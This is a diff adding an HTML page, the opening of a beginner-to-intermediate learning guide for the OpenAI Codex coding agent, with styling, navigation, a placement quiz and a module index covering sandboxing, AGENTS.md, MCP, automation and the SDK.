@@ -1,0 +1,2107 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>OpenAI Codex Learning Guide — Beginner to Intermediate</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=DM+Serif+Display:ital@0;1&display=swap">
+<style>
+:root{
+  --ink:#11201c;
+  --ink-soft:#3a4d47;
+  --paper:#f6f4ee;
+  --paper-2:#fffdf8;
+  --line:#d9d4c7;
+  --line-soft:#e7e2d6;
+  --teal:#0d7a6e;
+  --teal-deep:#075249;
+  --teal-wash:#e3efea;
+  --coral:#e0613a;
+  --coral-wash:#fbe9e0;
+  --amber:#caa23a;
+  --amber-wash:#f6eccc;
+  --code-bg:#0f1f1b;
+  --code-ink:#d7e6df;
+  --shadow:0 1px 2px rgba(17,32,28,.06),0 8px 24px rgba(17,32,28,.05);
+  --mono:"SFMono-Regular",ui-monospace,"JetBrains Mono","Cascadia Code",Menlo,Consolas,monospace;
+  --serif:"Iowan Old Style","Palatino Linotype",Palatino,"Book Antiqua",Georgia,serif;
+  --sans:"Inter",-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth}
+
+/* ── Skip link (WCAG 2.4.1 Bypass Blocks) ──────────────────
+   Sighted keyboard/screen-reader users can skip the sidebar nav
+   entirely instead of tabbing through every module link first. */
+.skip-link{
+  position:absolute;top:-3rem;left:0;z-index:100;
+  background:var(--teal-deep);color:#fff;padding:.6rem 1.1rem;
+  border-radius:0 0 8px 0;text-decoration:none;
+  font-family:var(--mono);font-size:.8rem;transition:top .2s;
+}
+.skip-link:focus{top:0}
+body{
+  margin:0;background:var(--paper);color:var(--ink);
+  font-family:var(--sans);font-size:16px;line-height:1.65;
+  -webkit-font-smoothing:antialiased;
+}
+
+/* ── Layout ─────────────────────────────────────────────── */
+.shell{display:grid;grid-template-columns:300px minmax(0,1fr);min-height:100vh}
+.sidebar{
+  position:sticky;top:0;height:100vh;overflow-y:auto;
+  background:var(--paper-2);border-right:1px solid var(--line);
+  padding:0;
+}
+.main{min-width:0;padding:0 0 8rem}
+.content{max-width:860px;margin:0 auto;padding:3.5rem 3rem 0}
+
+/* ── Sidebar brand ──────────────────────────────────────── */
+.brand{
+  padding:1.6rem 1.4rem 1.3rem;border-bottom:1px solid var(--line);
+  position:sticky;top:0;background:var(--paper-2);z-index:5;
+}
+.brand-kicker{
+  font-family:var(--mono);font-size:.66rem;letter-spacing:.22em;
+  text-transform:uppercase;color:var(--teal);font-weight:600;
+}
+.brand-title{
+  font-family:var(--serif);font-size:1.32rem;line-height:1.15;
+  margin:.45rem 0 .2rem;font-weight:600;letter-spacing:-.01em;
+}
+.brand-sub{font-size:.74rem;color:var(--ink-soft);font-family:var(--mono);letter-spacing:.02em}
+
+/* ── Hayah-AI logo strip ────────────────────────────────── */
+.hayah-logo-wrap{
+  padding:1.1rem 1.4rem .9rem;
+  background:#0a3d3a;
+  border-bottom:1px solid #07302e;
+  display:flex;
+  justify-content:center;
+}
+.hayah-logo-wrap svg{display:block;width:100%;height:auto;max-width:220px}
+
+/* ── Sidebar progress meter ─────────────────────────────── */
+.progress-wrap{padding:.9rem 1.4rem;border-bottom:1px solid var(--line-soft)}
+.progress-label{
+  display:flex;justify-content:space-between;align-items:baseline;
+  font-family:var(--mono);font-size:.66rem;letter-spacing:.1em;
+  text-transform:uppercase;color:var(--ink-soft);margin-bottom:.4rem;
+}
+.progress-label b{color:var(--teal-deep);font-size:.78rem}
+.progress-bar{height:6px;background:var(--line-soft);border-radius:99px;overflow:hidden}
+.progress-fill{height:100%;width:0;background:linear-gradient(90deg,var(--teal),var(--teal-deep));
+  border-radius:99px;transition:width .4s cubic-bezier(.4,0,.2,1)}
+.progress-reset{
+  margin-top:.55rem;font-family:var(--mono);font-size:.62rem;letter-spacing:.06em;
+  color:var(--ink-soft);background:none;border:none;cursor:pointer;padding:0;
+  text-transform:uppercase;text-decoration:underline;text-underline-offset:2px;
+}
+.progress-reset:hover{color:var(--coral)}
+
+/* ── Sidebar nav ────────────────────────────────────────── */
+nav{padding:.7rem .7rem 3rem}
+.nav-group{margin-bottom:.1rem}
+.nav-top{
+  display:block;padding:.4rem .7rem;border-radius:7px;
+  color:var(--ink-soft);text-decoration:none;font-size:.85rem;
+  line-height:1.3;transition:background .15s,color .15s;
+}
+.nav-top:hover{background:var(--teal-wash);color:var(--teal-deep)}
+.nav-phase{
+  font-weight:600;color:var(--ink);font-family:var(--sans);
+  letter-spacing:-.005em;margin-top:.3rem;
+}
+.nav-phase::before{
+  content:"";display:inline-block;width:6px;height:6px;border-radius:2px;
+  background:var(--teal);margin-right:.55rem;vertical-align:middle;opacity:.8;
+}
+.nav-children{
+  margin:.1rem 0 .35rem .55rem;padding-left:.7rem;
+  border-left:1px solid var(--line-soft);
+}
+.nav-child{
+  display:block;padding:.26rem .6rem;border-radius:6px;
+  color:var(--ink-soft);text-decoration:none;font-size:.78rem;line-height:1.3;
+  transition:background .15s,color .15s;
+}
+.nav-child:hover{background:var(--teal-wash);color:var(--teal-deep)}
+.nav-child.active,.nav-top.active{
+  background:var(--teal-wash);color:var(--teal-deep);font-weight:600;
+}
+
+/* ── Mobile nav toggle ──────────────────────────────────── */
+.menu-btn{
+  display:none;position:fixed;top:1rem;left:1rem;z-index:50;
+  background:var(--teal-deep);color:#fff;border:none;border-radius:8px;
+  width:44px;height:44px;font-size:1.3rem;cursor:pointer;box-shadow:var(--shadow);
+}
+
+/* ── Typography ─────────────────────────────────────────── */
+.content h1{
+  font-family:var(--serif);font-size:2.5rem;line-height:1.08;font-weight:600;
+  letter-spacing:-.02em;margin:.2rem 0 .3rem;
+}
+.content h1+h2{border:none;margin-top:0;padding-top:0;color:var(--teal-deep);
+  font-size:1.15rem;font-weight:600;font-family:var(--sans)}
+.content h1+h2+h3{color:var(--ink-soft);font-family:var(--mono);font-size:.8rem;
+  letter-spacing:.04em;font-weight:500;margin-top:.2rem;text-transform:none;border:none;padding:0}
+.content h2{
+  font-family:var(--serif);font-size:1.85rem;font-weight:600;letter-spacing:-.015em;
+  margin:3.2rem 0 1rem;padding-top:1.4rem;border-top:1px solid var(--line);
+  scroll-margin-top:1.5rem;
+}
+.content h3{
+  font-size:1.28rem;font-weight:650;margin:2.4rem 0 .6rem;letter-spacing:-.01em;
+  scroll-margin-top:1.5rem;color:var(--ink);
+}
+.content h3[id^="module"]{
+  color:var(--teal-deep);
+  padding-left:.85rem;border-left:3px solid var(--teal);
+}
+.content h4{
+  font-family:var(--mono);font-size:.92rem;font-weight:600;letter-spacing:.01em;
+  margin:1.8rem 0 .5rem;color:var(--ink-soft);scroll-margin-top:1.5rem;
+}
+.content p{margin:.7rem 0}
+.content a{color:var(--teal-deep);text-decoration:underline;text-underline-offset:2px;
+  text-decoration-thickness:1px;text-decoration-color:var(--line)}
+.content a:hover{text-decoration-color:var(--teal)}
+.content strong{font-weight:650;color:var(--ink)}
+.content em{font-style:italic}
+.content hr{border:none;border-top:1px solid var(--line-soft);margin:2.4rem 0}
+.content ul,.content ol{margin:.7rem 0;padding-left:1.3rem}
+.content li{margin:.3rem 0}
+.content li::marker{color:var(--teal)}
+
+/* ── Hero subject mark ──────────────────────────────────── */
+.hero{display:flex;align-items:center;justify-content:space-between;gap:2rem}
+.hero-text{min-width:0}
+.hero-mark{flex-shrink:0;display:flex;align-items:center;justify-content:center}
+.hero-mark svg{width:84px;height:84px;display:block}
+@media(max-width:1000px){
+  .hero{gap:1rem}
+  .hero-mark svg{width:48px;height:48px}
+}
+
+/* ── Blockquote: module metadata ────────────────────────── */
+blockquote.module-meta{
+  margin:.9rem 0 1.6rem;padding:.9rem 1.1rem;
+  background:var(--teal-wash);border:1px solid #cbe3db;
+  border-left:3px solid var(--teal);border-radius:0 9px 9px 0;
+  font-size:.86rem;line-height:1.55;
+}
+blockquote.module-meta p{margin:.2rem 0}
+blockquote.module-meta strong{color:var(--teal-deep)}
+
+/* ── Blockquote: general callout ────────────────────────── */
+blockquote.callout{
+  margin:1.3rem 0;padding:.9rem 1.1rem;
+  background:var(--amber-wash);border:1px solid #ecdcb0;
+  border-left:3px solid var(--amber);border-radius:0 9px 9px 0;
+  font-size:.9rem;
+}
+blockquote.callout p{margin:.25rem 0}
+blockquote.callout strong{color:#8a6d1d}
+.content blockquote:not(.module-meta):not(.callout){
+  margin:1.3rem 0;padding:.7rem 1.1rem;border-left:3px solid var(--line);
+  color:var(--ink-soft);background:var(--paper-2);border-radius:0 8px 8px 0;
+}
+
+/* ── Code ───────────────────────────────────────────────── */
+code{
+  font-family:var(--mono);font-size:.82em;
+  background:var(--teal-wash);color:var(--teal-deep);
+  padding:.12em .42em;border-radius:5px;border:1px solid #d3e7e0;
+}
+pre{
+  background:var(--code-bg);border:1px solid #1d342e;border-radius:11px;
+  padding:1.05rem 1.2rem;overflow-x:auto;margin:1.1rem 0;
+  box-shadow:var(--shadow);position:relative;
+}
+pre code{
+  background:none;border:none;color:var(--code-ink);padding:0;font-size:.82rem;
+  line-height:1.6;
+}
+pre::before{
+  content:attr(data-lang);position:absolute;top:.5rem;right:.8rem;
+  font-family:var(--mono);font-size:.6rem;letter-spacing:.12em;
+  text-transform:uppercase;color:#5a7d73;
+}
+
+/* ── Artifact card: scripts / frameworks / templates / worksheets ──────
+   Lighter, on-brand alternative to the dark code terminal — for
+   non-code artifacts (business / non-technical guides). Author with:
+   <pre class="artifact" data-kind="SCRIPT"><code>...</code></pre>            */
+pre.artifact{
+  background:var(--paper-2);border:1px solid var(--line);
+  border-left:3px solid var(--teal);border-radius:0 11px 11px 0;
+}
+pre.artifact code{color:var(--ink)}
+pre.artifact::before{content:attr(data-kind);color:var(--teal-deep)}
+
+/* ── Tables ─────────────────────────────────────────────── */
+.table-scroll{overflow-x:auto;margin:1.2rem 0;border-radius:10px;border:1px solid var(--line);
+  box-shadow:var(--shadow)}
+table{border-collapse:collapse;width:100%;font-size:.84rem;background:var(--paper-2)}
+th{
+  background:var(--teal-deep);color:#eef6f3;font-weight:600;text-align:left;
+  padding:.6rem .8rem;font-size:.74rem;letter-spacing:.04em;text-transform:uppercase;
+  white-space:nowrap;
+}
+td{padding:.55rem .8rem;border-top:1px solid var(--line-soft);vertical-align:top}
+tr:nth-child(even) td{background:#faf8f2}
+td code{font-size:.78em;white-space:nowrap}
+
+/* ── Interactive module index ───────────────────────────── */
+.module-index-table tr[data-href]{cursor:pointer}
+.module-index-table tr[data-href]:hover td{background:var(--teal-wash);color:var(--teal-deep)}
+.module-index-table td:first-child{
+  font-family:var(--mono);font-weight:700;color:var(--teal-deep);font-size:.82rem;
+}
+.module-index-table tr[data-href] td:first-child{
+  text-decoration:underline;text-underline-offset:2px;text-decoration-color:var(--line);
+}
+.module-index-table tr[data-href]:hover td:first-child{text-decoration-color:var(--teal)}
+
+/* ── Checklist enhancement ──────────────────────────────── *
+ * Checkbox + text are wrapped in one <label class="task-label">
+ * by the JS below, so the whole line is the click target — not
+ * just the 16px box. Meets WCAG 2.2 SC 2.5.8 (24x24 target size)
+ * via the label's hit area rather than the visual checkbox size. */
+.content li label.task-label{
+  display:flex;align-items:flex-start;gap:.55rem;cursor:pointer;
+  padding:.2rem 0;margin:-.2rem 0;
+}
+.content li label.task-label input[type=checkbox]{
+  margin:.2rem 0 0;flex-shrink:0;accent-color:var(--teal);
+  width:16px;height:16px;cursor:pointer;
+}
+
+/* ── Placement quiz: live score badge ──────────────────────
+   Injected by JS after each quiz <ul> — no authoring required. */
+.quiz-score{
+  display:inline-block;font-family:var(--mono);font-size:.76rem;
+  color:var(--teal-deep);background:var(--teal-wash);
+  padding:.3rem .75rem;border-radius:99px;margin:.2rem 0 1rem;
+}
+
+/* ── Sidebar module search/filter ──────────────────────────── */
+.nav-search-wrap{padding:.75rem 1.1rem .25rem}
+.nav-search{
+  width:100%;padding:.45rem .7rem;border:1px solid var(--line);
+  border-radius:8px;font-family:var(--sans);font-size:.8rem;
+  background:var(--paper);color:var(--ink);
+}
+.nav-search:focus-visible{outline:2px solid var(--teal);outline-offset:1px}
+.nav-child.filtered-out,.nav-top.filtered-out,.nav-group.filtered-out{display:none}
+.search-row{position:relative}
+.search-row .nav-search{padding-right:2.4rem}
+.search-kbd{
+  position:absolute;right:.5rem;top:50%;transform:translateY(-50%);
+  font-family:var(--mono);font-size:.66rem;color:var(--ink-soft);
+  border:1px solid var(--line);border-radius:4px;padding:0 .3rem;background:var(--paper-2);
+  pointer-events:none;
+}
+.search-row.has-query .search-kbd{display:none}
+.search-bar{
+  display:none;align-items:center;gap:.35rem;margin-top:.45rem;
+  font-size:.72rem;color:var(--ink-soft);
+}
+.search-bar.show{display:flex}
+.search-count{flex:1;font-family:var(--mono)}
+.search-bar button{
+  border:1px solid var(--line);background:var(--paper);color:var(--teal-deep);
+  border-radius:6px;font-size:.72rem;padding:.15rem .45rem;cursor:pointer;min-width:26px;min-height:24px;
+}
+.search-bar button:hover{background:var(--teal-wash)}
+.search-results{
+  display:none;margin:.5rem 0 .2rem;max-height:48vh;overflow-y:auto;
+  border:1px solid var(--line);border-radius:8px;background:var(--paper);
+}
+.search-results.show{display:block}
+.sr-group{border-top:1px solid var(--line-soft)}
+.sr-group:first-child{border-top:none}
+.sr-section{
+  font-size:.68rem;font-weight:700;letter-spacing:.04em;text-transform:uppercase;
+  color:var(--teal);padding:.5rem .65rem .15rem;
+}
+.sr-item{
+  display:block;width:100%;text-align:left;background:none;border:none;cursor:pointer;
+  font-family:var(--sans);font-size:.76rem;line-height:1.4;color:var(--ink);
+  padding:.35rem .65rem;
+}
+.sr-item:hover,.sr-item.current{background:var(--teal-wash)}
+.sr-item mark,.lg-hit{background:var(--amber-wash);color:inherit;border-radius:2px;padding:0 1px}
+.sr-more{font-size:.7rem;color:var(--ink-soft);padding:.1rem .65rem .45rem}
+.sr-empty{font-size:.78rem;color:var(--ink-soft);padding:.6rem .65rem}
+pre .lg-hit{background:#5c4a12;color:#fff4cf}
+.lg-hit.lg-hit-current{background:var(--coral);color:#fff;outline:2px solid var(--coral)}
+.lg-block-current{outline:2px dashed var(--teal);outline-offset:4px;border-radius:4px}
+
+/* ── Print (offline / PDF study copy) ──────────────────────── */
+@media print{
+  .menu-btn,.scrim,.sidebar,.totop,.skip-link{display:none}
+  .shell{display:block}
+  .content{max-width:100%;padding:0;margin:0}
+  a{color:inherit;text-decoration:underline}
+  pre,blockquote,table{break-inside:avoid}
+  h2,h3{break-after:avoid}
+}
+
+/* ── Footer ─────────────────────────────────────────────── */
+.content em:last-child{color:var(--ink-soft)}
+
+/* ── Back to top ────────────────────────────────────────── */
+.totop{
+  position:fixed;bottom:1.4rem;right:1.4rem;z-index:40;
+  background:var(--teal-deep);color:#fff;border:none;border-radius:10px;
+  width:46px;height:46px;font-size:1.1rem;cursor:pointer;box-shadow:var(--shadow);
+  opacity:0;pointer-events:none;transition:opacity .25s,transform .25s;
+}
+.totop.show{opacity:1;pointer-events:auto}
+.totop:hover{transform:translateY(-3px)}
+
+/* ── Responsive ─────────────────────────────────────────── */
+@media (max-width:1000px){
+  .shell{grid-template-columns:1fr}
+  .menu-btn{display:block}
+  .sidebar{
+    position:fixed;left:0;top:0;width:300px;z-index:45;
+    transform:translateX(-100%);transition:transform .28s cubic-bezier(.4,0,.2,1);
+    box-shadow:0 0 40px rgba(17,32,28,.25);
+  }
+  .sidebar.open{transform:translateX(0)}
+  .content{padding:4.5rem 1.4rem 0}
+  .content h1{font-size:2rem}
+  .content h2{font-size:1.5rem}
+  .scrim{position:fixed;inset:0;background:rgba(17,32,28,.4);z-index:44;
+    opacity:0;pointer-events:none;transition:opacity .25s}
+  .scrim.show{opacity:1;pointer-events:auto}
+}
+@media (min-width:1001px){.scrim{display:none}}
+
+@media (prefers-reduced-motion:reduce){
+  *{transition:none!important;scroll-behavior:auto!important}
+}
+
+/* ── Glossary definition list ────────────────────────────── */
+dl.glossary{margin:.5rem 0 1.6rem;padding:0}
+dl.glossary dt{
+  font-weight:650;color:var(--teal-deep);margin:1.2rem 0 .2rem;
+  font-size:.93rem;padding-left:.75rem;border-left:2px solid var(--teal);
+  scroll-margin-top:1.5rem;
+}
+dl.glossary dd{
+  margin:0 0 .2rem 1.75rem;line-height:1.65;font-size:.88rem;color:var(--ink);
+}
+dl.glossary .avoid{
+  font-size:.78rem;font-family:var(--mono);color:var(--ink-soft);
+  letter-spacing:.01em;margin-top:.05rem;
+}
+dl.glossary .avoid strong{color:var(--coral);font-weight:600}
+</style>
+</head>
+<body>
+<a href="#content" class="skip-link">Skip to content</a>
+<button class="menu-btn" id="menuBtn" aria-label="Toggle navigation">☰</button>
+<div class="scrim" id="scrim"></div>
+
+<div class="shell">
+  <aside class="sidebar" id="sidebar">
+    <div class="hayah-logo-wrap">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 344 96" role="img" aria-label="hayah-ai — expert guided learning">
+        <path d="M 12 52 A 28 28 0 0 1 52 12" fill="none" stroke="#faf7f5" stroke-width="8" stroke-linecap="round"/>
+        <circle cx="52" cy="12" r="6" fill="#ff6b47"/>
+        <text x="68" y="48" font-family="DM Serif Display, Georgia, serif" font-size="44" font-weight="400" fill="#faf7f5" letter-spacing="-1.2">hayah<tspan fill="#e8f4f1">-</tspan><tspan fill="#ff6b47" font-style="italic">ai</tspan></text>
+        <text x="0" y="84" font-family="Inter, Helvetica Neue, sans-serif" font-size="15" font-weight="300" fill="#e8f4f1" textLength="230" lengthAdjust="spacing">expert guided learning</text>
+      </svg>
+    </div>
+    <div class="brand">
+      <div class="brand-kicker">Self-Paced · Non-Linear</div>
+      <div class="brand-title">OpenAI Codex<br>Learning Guide</div>
+      <div class="brand-sub">Codex CLI · AGENTS.md · MCP · codex exec · SDK</div>
+    </div>
+    <div class="progress-wrap">
+      <div class="progress-label"><span>Module progress</span><b id="progPct">0%</b></div>
+      <div class="progress-bar"><div class="progress-fill" id="progFill"></div></div>
+      <button class="progress-reset" id="progReset">Reset progress</button>
+    </div>
+    <div class="nav-search-wrap">
+      <div class="search-row" id="searchRow">
+        <input type="search" id="navSearch" class="nav-search" placeholder="Search the guide…" aria-label="Search the whole guide" aria-controls="searchResults" autocomplete="off" spellcheck="false">
+        <span class="search-kbd" aria-hidden="true">/</span>
+      </div>
+      <div class="search-bar" id="searchBar">
+        <span class="search-count" id="searchCount" aria-live="polite"></span>
+        <button type="button" id="searchPrev" aria-label="Previous match">↑</button>
+        <button type="button" id="searchNext" aria-label="Next match">↓</button>
+        <button type="button" id="searchClear" aria-label="Clear search">✕</button>
+      </div>
+      <div class="search-results" id="searchResults" role="listbox" aria-label="Search results"></div>
+    </div>
+    <nav id="nav">
+<a href="#beginner-to-intermediate" class="nav-top">Beginner to Intermediate Track</a>
+<a href="#quick-start" class="nav-top">Quick Start</a>
+<a href="#placement-quiz" class="nav-top">Placement Quiz</a>
+<a href="#module-index" class="nav-top">Module Index</a>
+<a href="#learning-tracks" class="nav-top">Learning Tracks</a>
+<a href="#roadmap-overview" class="nav-top">Roadmap Overview</a>
+<div class="nav-group">
+<a href="#phase-1-foundations" class="nav-top nav-phase">Phase 1: Foundations</a>
+<div class="nav-children">
+<a href="#module-11-what-codex-is" class="nav-child">Module 1.1 — What Codex Is</a>
+<a href="#module-12-install-sign-in-first-session" class="nav-child">Module 1.2 — Install, Sign In, First Session</a>
+<a href="#module-13-prompting-and-plan-mode" class="nav-child">Module 1.3 — Prompting and Plan Mode</a>
+<a href="#module-14-models-and-reasoning-effort" class="nav-child">Module 1.4 — Models and Reasoning Effort</a>
+<a href="#phase-1-capstone-scaffold-devtoolkit" class="nav-child">Phase 1 Capstone: Scaffold DevToolkit</a>
+</div></div>
+<div class="nav-group">
+<a href="#phase-2-control-and-safety" class="nav-top nav-phase">Phase 2: Control &amp; Safety</a>
+<div class="nav-children">
+<a href="#module-21-sandbox-and-approvals" class="nav-child">Module 2.1 — Sandbox and Approvals</a>
+<a href="#module-22-config-toml-and-profiles" class="nav-child">Module 2.2 — config.toml and Profiles</a>
+<a href="#module-23-agents-md-project-instructions" class="nav-child">Module 2.3 — AGENTS.md Project Instructions</a>
+<a href="#module-24-session-control-and-review" class="nav-child">Module 2.4 — Session Control and Review</a>
+<a href="#phase-2-capstone-harden-the-workspace" class="nav-child">Phase 2 Capstone: Harden the Workspace</a>
+</div></div>
+<div class="nav-group">
+<a href="#phase-3-extending-codex" class="nav-top nav-phase">Phase 3: Extending Codex</a>
+<div class="nav-children">
+<a href="#module-31-mcp-servers" class="nav-child">Module 3.1 — MCP Servers</a>
+<a href="#module-32-skills" class="nav-child">Module 3.2 — Skills</a>
+<a href="#module-33-hooks-and-rules" class="nav-child">Module 3.3 — Hooks and Rules</a>
+<a href="#module-34-ide-extension-and-codex-cloud" class="nav-child">Module 3.4 — IDE Extension and Codex Cloud</a>
+<a href="#phase-3-capstone-devtoolkit-toolchain" class="nav-child">Phase 3 Capstone: DevToolkit Toolchain</a>
+</div></div>
+<div class="nav-group">
+<a href="#phase-4-automation" class="nav-top nav-phase">Phase 4: Automation</a>
+<div class="nav-children">
+<a href="#module-41-codex-exec-and-structured-output" class="nav-child">Module 4.1 — codex exec and Structured Output</a>
+<a href="#module-42-github-review-and-ci" class="nav-child">Module 4.2 — GitHub Review and CI</a>
+<a href="#module-43-the-codex-sdk" class="nav-child">Module 4.3 — The Codex SDK</a>
+<a href="#phase-4-capstone-automated-pr-pipeline" class="nav-child">Phase 4 Capstone: Automated PR Pipeline</a>
+</div></div>
+<a href="#final-capstone-devtoolkit-ships-with-codex" class="nav-top">Final Capstone</a>
+<a href="#quick-reference" class="nav-top">Quick Reference</a>
+<a href="#glossary" class="nav-top">Glossary</a>
+<a href="#resources" class="nav-top">Resources &amp; Communities</a>
+<a href="#progress-tracker" class="nav-top">Progress Tracker</a>
+
+    </nav>
+  </aside>
+
+  <main class="main">
+    <article class="content" id="content">
+<div class="hero">
+<div class="hero-text">
+<h1 id="openai-codex-learning-guide">OpenAI Codex Learning Guide</h1>
+<h2 id="beginner-to-intermediate">Beginner to Intermediate Track</h2>
+<h3>Codex CLI · IDE Extension · Codex Cloud · AGENTS.md · MCP · codex exec · Codex SDK</h3>
+</div>
+<div class="hero-mark">
+<svg viewBox="0 0 256 256" role="img" aria-label="OpenAI Codex" xmlns="http://www.w3.org/2000/svg">
+  <rect x="20" y="44" width="216" height="168" rx="28" fill="none" stroke="#075249" stroke-width="16"/>
+  <polyline points="62,104 102,132 62,160" fill="none" stroke="#075249" stroke-width="18" stroke-linecap="round" stroke-linejoin="round"/>
+  <line x1="120" y1="164" x2="168" y2="164" stroke="#0d7a6e" stroke-width="18" stroke-linecap="round"/>
+  <path d="M194 70 L201 88 L219 95 L201 102 L194 120 L187 102 L169 95 L187 88 Z" fill="#0d7a6e"/>
+</svg>
+</div>
+</div>
+<blockquote class="callout">
+<p><strong>How to use this guide — you do NOT have to start at Module 1.1</strong><br>
+This guide is built to be <strong>non-linear</strong>. Each module is self-contained with its own prerequisites, skip-check, and outcomes. Use the <strong>Placement Quiz</strong> below to find your entry point, or jump straight to any module using the <strong>Module Index</strong>. Every exercise and capstone uses the same realistic <strong>DevToolkit</strong> project — a TypeScript + Express + Prisma REST API that you build and extend <em>with</em> Codex. Spec in <a href="../datasets/devtoolkit/README.md"><code>datasets/devtoolkit/</code></a>.</p>
+</blockquote>
+<blockquote class="callout"><p><strong>Disambiguation:</strong> "Codex" today means OpenAI's <strong>coding agent</strong> (CLI, IDE extension, desktop/web app, cloud tasks). It is not the 2021 Codex <em>language model</em> that powered early GitHub Copilot — that model was retired in 2023. Anything you read about <code>code-davinci-002</code> or "Codex API completions" is about the old model and does not apply here.</p></blockquote>
+
+<h2 id="quick-start">Quick Start: Three Ways to Use This Guide</h2>
+<ol>
+<li><strong>Complete beginner</strong> → Start at Module 1.1 and go sequentially.</li>
+<li><strong>Some experience</strong> → Take the <strong>Placement Quiz</strong> (next section) to find your entry point.</li>
+<li><strong>Targeting a specific skill</strong> → Jump via the <strong>Module Index</strong> or <strong>Learning Tracks</strong> — Track 4 is built for people who already use Claude Code.</li>
+</ol>
+
+<h2 id="placement-quiz">Placement Quiz — Find Your Starting Point</h2>
+<p>Answer honestly. Score 1 point per "yes." Your <strong>lowest-scoring</strong> area is where you should start.</p>
+<h3>A. Everyday CLI Use</h3>
+<ul>
+<li>[ ] I have installed the Codex CLI and signed in with ChatGPT or an API key.</li>
+<li>[ ] I can explain the difference between Codex CLI, the IDE extension, and Codex cloud tasks.</li>
+<li>[ ] I write prompts that name files, constraints, and a "done when" check, and I use plan mode for multi-step work.</li>
+<li>[ ] I switch model and reasoning effort deliberately depending on the task.</li>
+</ul>
+<p><strong>0–1 yes</strong> → Start <strong>Module 1.1</strong> | <strong>2–3 yes</strong> → Start <strong>Module 1.3</strong> | <strong>4 yes</strong> → Skip to <strong>Phase 2</strong></p>
+<h3>B. Control &amp; Safety</h3>
+<ul>
+<li>[ ] I can name the three <code>sandbox_mode</code> values and what each allows.</li>
+<li>[ ] I know which <code>approval_policy</code> values are supported today and which were removed.</li>
+<li>[ ] I maintain an AGENTS.md that Codex reliably follows.</li>
+<li>[ ] I use profiles in <code>config.toml</code> to switch between a safe and a permissive setup.</li>
+</ul>
+<p><strong>0–1 yes</strong> → Start <strong>Module 2.1</strong> | <strong>2–3 yes</strong> → Start <strong>Module 2.3</strong> | <strong>4 yes</strong> → Skip to <strong>Phase 3</strong></p>
+<h3>C. Extending Codex</h3>
+<ul>
+<li>[ ] I have connected at least one MCP server to Codex in <code>config.toml</code>.</li>
+<li>[ ] I have written a skill (<code>SKILL.md</code>) and seen Codex invoke it.</li>
+<li>[ ] I know where hooks and <code>.rules</code> files live and what each is for.</li>
+<li>[ ] I have delegated a task to Codex cloud and applied its result locally.</li>
+</ul>
+<p><strong>0–1 yes</strong> → Start <strong>Module 3.1</strong> | <strong>2–3 yes</strong> → Start <strong>Module 3.3</strong> | <strong>4 yes</strong> → Skip to <strong>Phase 4</strong></p>
+<h3>D. Automation</h3>
+<ul>
+<li>[ ] I can run <code>codex exec</code> non-interactively and capture its final message to a file.</li>
+<li>[ ] I can force Codex to return JSON matching a schema with <code>--output-schema</code>.</li>
+<li>[ ] I have run <code>openai/codex-action</code> in a GitHub Actions workflow.</li>
+<li>[ ] I have driven Codex from TypeScript with <code>@openai/codex-sdk</code>.</li>
+</ul>
+<p><strong>0–1 yes</strong> → Start <strong>Module 4.1</strong> | <strong>2–3 yes</strong> → Start <strong>Module 4.2</strong> | <strong>4 yes</strong> → Skip to <strong>Final Capstone</strong></p>
+<blockquote class="callout"><p><strong>Rule of thumb:</strong> If you can complete a module's exercise without studying it, skip the module. The exercise <em>is</em> the test-out.</p></blockquote>
+
+<h2 id="module-index">Module Index (Jump Anywhere)</h2>
+<p style="font-size:.82rem;color:var(--ink-soft);margin:.2rem 0 .9rem">Click any row to jump to that module.</p>
+<table class="module-index-table">
+<thead>
+<tr><th>Module</th><th>Topic</th><th>Level</th><th>Prereqs</th><th>Time</th></tr>
+</thead>
+<tbody>
+<tr data-href="#module-11-what-codex-is"><td>1.1</td><td>What Codex Is</td><td>Beginner</td><td>None</td><td>2h</td></tr>
+<tr data-href="#module-12-install-sign-in-first-session"><td>1.2</td><td>Install, Sign In, First Session</td><td>Beginner</td><td>1.1</td><td>2h</td></tr>
+<tr data-href="#module-13-prompting-and-plan-mode"><td>1.3</td><td>Prompting and Plan Mode</td><td>Beginner</td><td>1.2</td><td>3h</td></tr>
+<tr data-href="#module-14-models-and-reasoning-effort"><td>1.4</td><td>Models and Reasoning Effort</td><td>Beginner–Intermediate</td><td>1.2</td><td>2h</td></tr>
+<tr data-href="#module-21-sandbox-and-approvals"><td>2.1</td><td>Sandbox and Approvals</td><td>Beginner–Intermediate</td><td>1.2</td><td>3h</td></tr>
+<tr data-href="#module-22-config-toml-and-profiles"><td>2.2</td><td>config.toml and Profiles</td><td>Intermediate</td><td>2.1</td><td>3h</td></tr>
+<tr data-href="#module-23-agents-md-project-instructions"><td>2.3</td><td>AGENTS.md Project Instructions</td><td>Beginner–Intermediate</td><td>1.3</td><td>3h</td></tr>
+<tr data-href="#module-24-session-control-and-review"><td>2.4</td><td>Session Control and Review</td><td>Beginner–Intermediate</td><td>1.3</td><td>2h</td></tr>
+<tr data-href="#module-31-mcp-servers"><td>3.1</td><td>MCP Servers</td><td>Intermediate</td><td>2.2</td><td>3h</td></tr>
+<tr data-href="#module-32-skills"><td>3.2</td><td>Skills</td><td>Intermediate</td><td>2.3</td><td>3h</td></tr>
+<tr data-href="#module-33-hooks-and-rules"><td>3.3</td><td>Hooks and Rules</td><td>Intermediate</td><td>2.1, 2.2</td><td>3h</td></tr>
+<tr data-href="#module-34-ide-extension-and-codex-cloud"><td>3.4</td><td>IDE Extension and Codex Cloud</td><td>Intermediate</td><td>2.3</td><td>3h</td></tr>
+<tr data-href="#module-41-codex-exec-and-structured-output"><td>4.1</td><td>codex exec and Structured Output</td><td>Intermediate</td><td>2.1</td><td>3h</td></tr>
+<tr data-href="#module-42-github-review-and-ci"><td>4.2</td><td>GitHub Review and CI</td><td>Intermediate</td><td>4.1</td><td>4h</td></tr>
+<tr data-href="#module-43-the-codex-sdk"><td>4.3</td><td>The Codex SDK</td><td>Advanced</td><td>4.1</td><td>4h</td></tr>
+</tbody>
+</table>
